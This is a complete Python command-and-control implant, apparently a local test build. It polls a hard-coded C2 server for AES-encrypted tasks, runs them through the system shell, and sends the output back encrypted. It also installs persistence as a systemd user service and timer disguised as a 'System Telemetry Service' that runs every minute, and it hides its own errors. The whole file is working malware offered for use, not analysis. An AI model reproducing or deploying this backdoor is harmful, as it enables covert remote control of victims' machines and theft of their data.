import requests
import subprocess
import time
import os
from pathlib import Path
from Cryptodome.Cipher import AES
from Cryptodome.Util.Padding import pad, unpad
import base64

# The address of the C2 Server
# Testing locally for now
SERVER_URL = "http://100.65.3.15:5000"
AGENT_ID = "agent_001"

# This MUST be exactly 16, 24, or 32 bytes long
SECRET_KEY = b'SixteenByteKey!!' 

def encrypt_msg(plaintext):
    cipher = AES.new(SECRET_KEY, AES.MODE_CBC)
    ct_bytes = cipher.encrypt(pad(plaintext.encode(), AES.block_size))
    return base64.b64encode(cipher.iv + ct_bytes).decode('utf-8')

def decrypt_msg(encoded_ciphertext):
    raw = base64.b64decode(encoded_ciphertext)
    iv = raw[:16]
    ciphertext = raw[16:]
    cipher = AES.new(SECRET_KEY, AES.MODE_CBC, iv)
    return unpad(cipher.decrypt(ciphertext), AES.block_size).decode('utf-8')

def install_persistence():
    # 1. Define the paths
    home = str(Path.home())
    systemd_dir = os.path.join(home, ".config/systemd/user")
    service_path = os.path.join(systemd_dir, "agent.service")
    timer_path = os.path.join(systemd_dir, "agent.timer")
    
    # Ensure the directory exists
    os.makedirs(systemd_dir, exist_ok=True)

    # 2. Define the file contents
    # script_path is the absolute path to this script
    script_path = os.path.abspath(__file__)
    
    service_content = f"""[Unit]
Description=System Telemetry Service
[Service]
ExecStart=/usr/bin/python3 {script_path}
Type=oneshot
"""

    timer_content = """[Unit]
Description=Run System Telemetry every minute
[Timer]
OnActiveSec=1min
OnUnitActiveSec=1min
RandomizedDelaySec=10
[Install]
WantedBy=timers.target
"""


    # 3. Write the files if they don't exist
    if not os.path.exists(service_path):
        with open(service_path, "w") as f:
            f.write(service_content)
            
    if not os.path.exists(timer_path):
        with open(timer_path, "w") as f:
            f.write(timer_content)

    # 4. Tell systemd to load them and start
    subprocess.run(["systemctl", "--user", "daemon-reload"], check=True)
    subprocess.run(["systemctl", "--user", "enable", "agent.timer"], check=True)
    subprocess.run(["systemctl", "--user", "start", "agent.timer"], check=True)
    
    print("[+] Persistence installed successfully.")

def check_in():
    try:
        # 1. Ask for a task
        response = requests.get(f"{SERVER_URL}/get_task/{AGENT_ID}")
        encrypted_task = response.json().get("task")

        task = decrypt_msg(encrypted_task)

        # 2. If the task is nop, do nothing
        if task == "nop":
            return

        # 3. Execute the task using the system shell
        print(f"[*] Executing task: {task}")
        process = subprocess.Popen(task, shell=True, 
                                   stdout=subprocess.PIPE, 
                                   stderr=subprocess.PIPE, 
                                   text=True)
        stdout, stderr = process.communicate()
        
        # Combine output and errors to send back
        result = stdout + stderr

        # 4. Send the result back to the server
        encrypted_result = encrypt_msg(result)
        requests.post(f"{SERVER_URL}/post_result/{AGENT_ID}", json={"result": encrypted_result})
        
    # 5. Fail silently if there's an error
    except Exception as e:
        pass

if __name__ == "__main__":
    if not os.path.exists(os.path.expanduser("~/.config/systemd/user/agent.timer")):
        install_persistence()
    check_in()